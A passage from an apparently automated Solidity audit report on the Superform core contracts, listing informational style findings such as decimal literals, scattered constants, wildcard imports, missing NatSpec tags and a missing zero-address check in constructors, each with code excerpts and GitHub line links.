[65](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L65), [66](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L66), [67](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L67), [68](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L68), [69](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L69), [70](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L70)



### Large multiples of ten should use scientific notation

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Use a scientific notation rather than decimal literals (e.g. `1e6` instead of `1000000`), for better code readability.

*Instances (5)*:

```solidity
File: superform-core/src/BaseRouterImplementation.sol

789:         if (maxSlippage_ > 10_000) return false;

```

[789](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L789)

```solidity
File: superform-core/src/crosschain-liquidity/DstSwapper.sol

353:         if (v.balanceDiff < ((v.expAmount * (10_000 - v.maxSlippage)) / 10_000)) {

353:         if (v.balanceDiff < ((v.expAmount * (10_000 - v.maxSlippage)) / 10_000)) {

```

[353](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L353), [353](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L353)

```solidity
File: superform-core/src/libraries/PayloadUpdaterLib.sol

24:         uint256 minAmount = (maxAmount_ * (10_000 - slippage_)) / 10_000;

24:         uint256 minAmount = (maxAmount_ * (10_000 - slippage_)) / 10_000;

```

[24](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/PayloadUpdaterLib.sol#L24), [24](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/PayloadUpdaterLib.sol#L24)




### Use a single file for every system wide constants

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Consider grouping all the system constants under a single file. This finding shows only the first constant for each file, for brevity.

*Instances (47)*:


```solidity
File: superform-core/src/BaseRouter.sol

24:     uint8 internal constant STATE_REGISTRY_TYPE = 1;

```

[24](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L24)

```solidity
File: superform-core/src/SuperformFactory.sol

27:     uint8 private constant NON_PAUSED = 1;

28:     uint8 private constant PAUSED = 2;

32:     bytes32 constant SYNC_IMPLEMENTATION_STATUS = keccak256("SYNC_IMPLEMENTATION_STATUS");

```

[27](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L27), [28](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L28), [32](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L32)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol

25:     uint8 constant BROADCAST_REGISTRY_ID = 3;

```

[25](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L25)

```solidity
File: superform-core/src/crosschain-liquidity/BridgeValidator.sol

15:     address constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

```

[15](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/BridgeValidator.sol#L15)

```solidity
File: superform-core/src/crosschain-liquidity/LiquidityHandler.sol

21:     address constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

```

[21](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/LiquidityHandler.sol#L21)

```solidity
File: superform-core/src/forms/ERC4626Form.sol

15:     uint8 constant stateRegistryId = 1; // CoreStateRegistry

```

[15](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626Form.sol#L15)

```solidity
File: superform-core/src/forms/ERC4626KYCDaoForm.sol

18:     uint8 constant stateRegistryId = 1; // CoreStateRegistry

```

[18](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626KYCDaoForm.sol#L18)

```solidity
File: superform-core/src/forms/ERC4626TimelockForm.sol

26:     uint8 constant stateRegistryId = 2; // TimelockStateRegistry

```

[26](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L26)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

37:     uint32 private constant TIMELOCK_FORM_ID = 2;

```

[37](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L37)

```solidity
File: superform-core/src/settings/SuperRBAC.sol

19:     bytes32 public constant SYNC_REVOKE = keccak256("SYNC_REVOKE");

23:     bytes32 public constant override PROTOCOL_ADMIN_ROLE = keccak256("PROTOCOL_ADMIN_ROLE");

27:     bytes32 public constant override EMERGENCY_ADMIN_ROLE = keccak256("EMERGENCY_ADMIN_ROLE");

31:     bytes32 public constant override PAYMENT_ADMIN_ROLE = keccak256("PAYMENT_ADMIN_ROLE");

36:     bytes32 public constant override BROADCASTER_ROLE = keccak256("BROADCASTER_ROLE");

40:     bytes32 public constant override CORE_STATE_REGISTRY_PROCESSOR_ROLE =

45:     bytes32 public constant override TIMELOCK_STATE_REGISTRY_PROCESSOR_ROLE =

50:     bytes32 public constant override BROADCAST_STATE_REGISTRY_PROCESSOR_ROLE =

55:     bytes32 public constant override CORE_STATE_REGISTRY_UPDATER_ROLE = keccak256("CORE_STATE_REGISTRY_UPDATER_ROLE");

59:     bytes32 public constant override CORE_STATE_REGISTRY_RESCUER_ROLE = keccak256("CORE_STATE_REGISTRY_RESCUER_ROLE");

63:     bytes32 public constant override CORE_STATE_REGISTRY_DISPUTER_ROLE = keccak256("CORE_STATE_REGISTRY_DISPUTER_ROLE");

67:     bytes32 public constant override DST_SWAPPER_ROLE = keccak256("DST_SWAPPER_ROLE");

72:     bytes32 public constant override WORMHOLE_VAA_RELAYER_ROLE = keccak256("WORMHOLE_VAA_RELAYER_ROLE");

```

[19](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L19), [23](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L23), [27](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L27), [31](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L31), [36](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L36), [40](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L40), [45](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L45), [50](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L50), [55](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L55), [59](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L59), [63](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L63), [67](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L67), [72](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L72)

```solidity
File: superform-core/src/settings/SuperRegistry.sol

17:     uint256 private constant MIN_DELAY = 1 hours;

18:     uint256 private constant MAX_DELAY = 24 hours;

23:     bytes32 public constant override SUPERFORM_ROUTER = keccak256("SUPERFORM_ROUTER");

26:     bytes32 public constant override SUPERFORM_FACTORY = keccak256("SUPERFORM_FACTORY");

29:     bytes32 public constant override SUPER_TRANSMUTER = keccak256("SUPER_TRANSMUTER");

32:     bytes32 public constant override PAYMASTER = keccak256("PAYMASTER");

36:     bytes32 public constant override PAYMENT_HELPER = keccak256("PAYMENT_HELPER");

39:     bytes32 public constant override CORE_STATE_REGISTRY = keccak256("CORE_STATE_REGISTRY");

42:     bytes32 public constant override TIMELOCK_STATE_REGISTRY = keccak256("TIMELOCK_STATE_REGISTRY");

45:     bytes32 public constant override BROADCAST_REGISTRY = keccak256("BROADCAST_REGISTRY");

48:     bytes32 public constant override SUPER_POSITIONS = keccak256("SUPER_POSITIONS");

51:     bytes32 public constant override SUPER_RBAC = keccak256("SUPER_RBAC");

54:     bytes32 public constant override PAYLOAD_HELPER = keccak256("PAYLOAD_HELPER");

57:     bytes32 public constant override DST_SWAPPER = keccak256("DST_SWAPPER");

60:     bytes32 public constant override EMERGENCY_QUEUE = keccak256("EMERGENCY_QUEUE");

63:     bytes32 public constant override PAYMENT_ADMIN = keccak256("PAYMENT_ADMIN");

64:     bytes32 public constant override CORE_REGISTRY_PROCESSOR = keccak256("CORE_REGISTRY_PROCESSOR");

65:     bytes32 public constant override BROADCAST_REGISTRY_PROCESSOR = keccak256("BROADCAST_REGISTRY_PROCESSOR");

66:     bytes32 public constant override TIMELOCK_REGISTRY_PROCESSOR = keccak256("TIMELOCK_REGISTRY_PROCESSOR");

67:     bytes32 public constant override CORE_REGISTRY_UPDATER = keccak256("CORE_REGISTRY_UPDATER");

68:     bytes32 public constant override CORE_REGISTRY_RESCUER = keccak256("CORE_REGISTRY_RESCUER");

69:     bytes32 public constant override CORE_REGISTRY_DISPUTER = keccak256("CORE_REGISTRY_DISPUTER");

70:     bytes32 public constant override DST_SWAPPER_PROCESSOR = keccak256("DST_SWAPPER_PROCESSOR");

```

[17](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L17), [18](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L18), [23](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L23), [26](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L26), [29](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L29), [32](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L32), [36](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L36), [39](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L39), [42](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L42), [45](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L45), [48](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L48), [51](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L51), [54](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L54), [57](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L57), [60](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L60), [63](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L63), [64](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L64), [65](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L65), [66](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L66), [67](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L67), [68](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L68), [69](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L69), [70](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L70)




### Non-usage of specific imports

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The current form of relative path import is not recommended for use because it can unpredictably pollute the namespace. Instead, the Solidity docs recommend specifying imported symbols explicitly. [https://docs.soliditylang.org/en/v0.8.15/layout-of-source-files.html#importing-other-source-files](https://docs.soliditylang.org/en/v0.8.15/layout-of-source-files.html#importing-other-source-files)

*Instances (11)*:


```solidity
File: superform-core/src/BaseRouter.sol

8: import "./libraries/Error.sol";

9: import "./types/DataTypes.sol";

```

[8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L8), [9](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L9)

```solidity
File: superform-core/src/BaseRouterImplementation.sol

18: import "./crosschain-liquidity/LiquidityHandler.sol";

19: import "./types/DataTypes.sol";

```

[18](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L18), [19](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L19)

```solidity
File: superform-core/src/EmergencyQueue.sol

11: import "./types/DataTypes.sol";

```

[11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/EmergencyQueue.sol#L11)

```solidity
File: superform-core/src/SuperformRouter.sol

7: import "./types/DataTypes.sol";

```

[7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformRouter.sol#L7)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol

13: import "src/vendor/wormhole/Utils.sol";

```

[13](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L13)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol

11: import "src/vendor/wormhole/Utils.sol";

```

[11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L11)

```solidity
File: superform-core/src/crosschain-data/extensions/TimelockStateRegistry.sol

21: import "../../types/DataTypes.sol";

```

[21](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L21)

```solidity
File: superform-core/src/crosschain-liquidity/DstSwapper.sol

16: import "../types/DataTypes.sol";

```

[16](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L16)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

14: import "../types/DataTypes.sol";

```

[14](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L14)



### test_for_test

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

test_for_test



### Constructor lacking address(0) check 

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Impact
Constructor does not check for address (0) that can lead to accidently setting address to 0x00.
Lack of address(0) check can lead to loss of administrative role base functions if incidentally no address is entered at time of deployment.

- Code Reference

https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L82
https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L97


- Proof of Concept
The constructor lacks address zero check for critical addresses setting.

```
File: src/BaseRouterImplementation.sol

     constructor(address superRegistry_) BaseRouter(superRegistry_) { }
```

```
File : src/payments/PaymentHelper.sol

    constructor(address superRegistry_) {
        if (block.chainid > type(uint64).max) {
            revert Error.BLOCK_CHAIN_ID_OUT_OF_BOUNDS();
        }
        CHAIN_ID = uint64(block.chainid);
        superRegistry = ISuperRegistry(superRegistry_);
    }
```


- Tools Used
Manual Review

- Recommended Mitigation Steps
Use standard Check-Effect-Interactions (CEIs) that validates that address is not zero.

```diff
File: src/BaseRouterImplementation.sol

```

```diff
File : src/payments/PaymentHelper.sol

    constructor(address superRegistry_) {
        if (block.chainid > type(uint64).max) {
            revert Error.BLOCK_CHAIN_ID_OUT_OF_BOUNDS();
        }
        CHAIN_ID = uint64(block.chainid);

+	require(superRegistry_!= address(0), ‘address cannot be zero’)**
        superRegistry = ISuperRegistry(superRegistry_);
    }
```




### Contract declaration should include NatSpec documentation

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

*Instances (36)*:


```solidity
File: ERC1155A/src/ERC1155A.sol

/// @audit missed @notice, @author
22: abstract contract ERC1155A is IERC1155A, IERC1155Errors {

```

[22](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L22)

```solidity
File: ERC1155A/src/aERC20.sol

/// @audit missed @notice
10: contract aERC20 is ERC20, IaERC20 {

```

[10](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/aERC20.sol#L10)

```solidity
File: superform-core/src/BaseForm.sol

/// @audit missed @notice
18: abstract contract BaseForm is Initializable, ERC165, IBaseForm {

```

[18](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseForm.sol#L18)

```solidity
File: superform-core/src/BaseRouter.sol

/// @audit missed @notice
15: abstract contract BaseRouter is IBaseRouter {

```

[15](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L15)

```solidity
File: superform-core/src/BaseRouterImplementation.sol

/// @audit missed @notice
24: abstract contract BaseRouterImplementation is IBaseRouterImplementation, BaseRouter, LiquidityHandler {

```

[24](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L24)

```solidity
File: superform-core/src/EmergencyQueue.sol

/// @audit missed @notice
16: contract EmergencyQueue is IEmergencyQueue {

```

[16](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/EmergencyQueue.sol#L16)

```solidity
File: superform-core/src/SuperformFactory.sol

/// @audit missed @notice
20: contract SuperformFactory is ISuperformFactory {

```

[20](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L20)

```solidity
File: superform-core/src/SuperformRouter.sol

/// @audit missed @notice
12: contract SuperformRouter is BaseRouterImplementation {

```

[12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformRouter.sol#L12)

```solidity
File: superform-core/src/crosschain-data/BaseStateRegistry.sol

/// @audit missed @notice
18: abstract contract BaseStateRegistry is IBaseStateRegistry {

```

[18](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L18)

```solidity
File: superform-core/src/crosschain-data/BroadcastRegistry.sol

/// @audit missed @notice, @dev, @author, @title
12: interface Target {

/// @audit missed @dev
19: contract BroadcastRegistry is IBroadcastRegistry {

```

[12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BroadcastRegistry.sol#L12), [19](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BroadcastRegistry.sol#L19)

```solidity
File: superform-core/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol

/// @audit missed @notice
19: contract HyperlaneImplementation is IAmbImplementation, IMessageRecipient {

```

[19](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L19)

```solidity
File: superform-core/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol

/// @audit missed @notice
18: contract LayerzeroImplementation is IAmbImplementation, ILayerZeroUserApplicationConfig, ILayerZeroReceiver {

```

[18](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L18)

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

/// @audit missed @notice
36: contract CoreStateRegistry is BaseStateRegistry, ICoreStateRegistry {

```

[36](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L36)

```solidity
File: superform-core/src/crosschain-data/extensions/TimelockStateRegistry.sol

/// @audit missed @dev
27: contract TimelockStateRegistry is BaseStateRegistry, ITimelockStateRegistry, ReentrancyGuard {

```

[27](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L27)

```solidity
File: superform-core/src/crosschain-data/utils/PayloadHelper.sol

/// @audit missed @notice
28: contract PayloadHelper is IPayloadHelper {

```

[28](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L28)

```solidity
File: superform-core/src/crosschain-data/utils/QuorumManager.sol

/// @audit missed @notice
11: abstract contract QuorumManager is IQuorumManager {

```

[11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/QuorumManager.sol#L11)

```solidity
File: superform-core/src/crosschain-liquidity/BridgeValidator.sol

/// @audit missed @notice
10: abstract contract BridgeValidator is IBridgeValidator {

```

[10](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/BridgeValidator.sol#L10)

```solidity
File: superform-core/src/crosschain-liquidity/DstSwapper.sol

/// @audit missed @notice
21: contract DstSwapper is IDstSwapper, ReentrancyGuard, LiquidityHandler {

```

[21](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L21)

```solidity
File: superform-core/src/crosschain-liquidity/LiquidityHandler.sol

/// @audit missed @notice
14: abstract contract LiquidityHandler {

```

[14](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/LiquidityHandler.sol#L14)

```solidity
File: superform-core/src/crosschain-liquidity/lifi/LiFiValidator.sol

/// @audit missed @notice
14: contract LiFiValidator is BridgeValidator, LiFiTxDataExtractor {

```

[14](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L14)

```solidity
File: superform-core/src/crosschain-liquidity/socket/SocketOneInchValidator.sol

/// @audit missed @notice
11: contract SocketOneInchValidator is BridgeValidator {

```

[11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketOneInchValidator.sol#L11)

```solidity
File: superform-core/src/crosschain-liquidity/socket/SocketValidator.sol

/// @audit missed @notice
11: contract SocketValidator is BridgeValidator {

```

[11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketValidator.sol#L11)

```solidity
File: superform-core/src/forms/ERC4626Form.sol

/// @audit missed @dev, @author
10: contract ERC4626Form is ERC4626FormImplementation {

```

[10](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626Form.sol#L10)

```solidity
File: superform-core/src/forms/ERC4626FormImplementation.sol

/// @audit missed @dev, @author
17: abstract contract ERC4626FormImplementation is BaseForm, LiquidityHandler {

```

[17](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L17)

```solidity
File: superform-core/src/forms/ERC4626KYCDaoForm.sol

/// @audit missed @dev, @author
13: contract ERC4626KYCDaoForm is ERC4626FormImplementation {

```

[13](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626KYCDaoForm.sol#L13)

```solidity
File: superform-core/src/forms/ERC4626TimelockForm.sol

/// @audit missed @dev, @author
18: contract ERC4626TimelockForm is ERC4626FormImplementation {

```

[18](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L18)

```solidity
File: superform-core/src/libraries/ArrayCastLib.sol

/// @audit missed @author, @title
8: library ArrayCastLib {

```

[8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/ArrayCastLib.sol#L8)

```solidity
File: superform-core/src/libraries/DataLib.sol

/// @audit missed @notice, @author, @title
7: library DataLib {

```

[7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L7)

```solidity
File: superform-core/src/libraries/PayloadUpdaterLib.sol

/// @audit missed @notice, @author, @title
9: library PayloadUpdaterLib {

```

[9](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/PayloadUpdaterLib.sol#L9)

```solidity
File: superform-core/src/libraries/ProofLib.sol

/// @audit missed @notice, @author, @title
7: library ProofLib {

```

[7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/ProofLib.sol#L7)

```solidity
File: superform-core/src/payments/PayMaster.sol

/// @audit missed @notice, @dev
15: contract PayMaster is IPayMaster, LiquidityHandler {

```

[15](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PayMaster.sol#L15)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

/// @audit missed @notice, @author, @title
17: interface ReadOnlyBaseRegistry is IBaseStateRegistry {

/// @audit missed @notice
24: contract PaymentHelper is IPaymentHelper {

```

[17](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L17), [24](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L24)

```solidity
File: superform-core/src/settings/SuperRBAC.sol

/// @audit missed @notice
14: contract SuperRBAC is ISuperRBAC, AccessControlEnumerable {

```

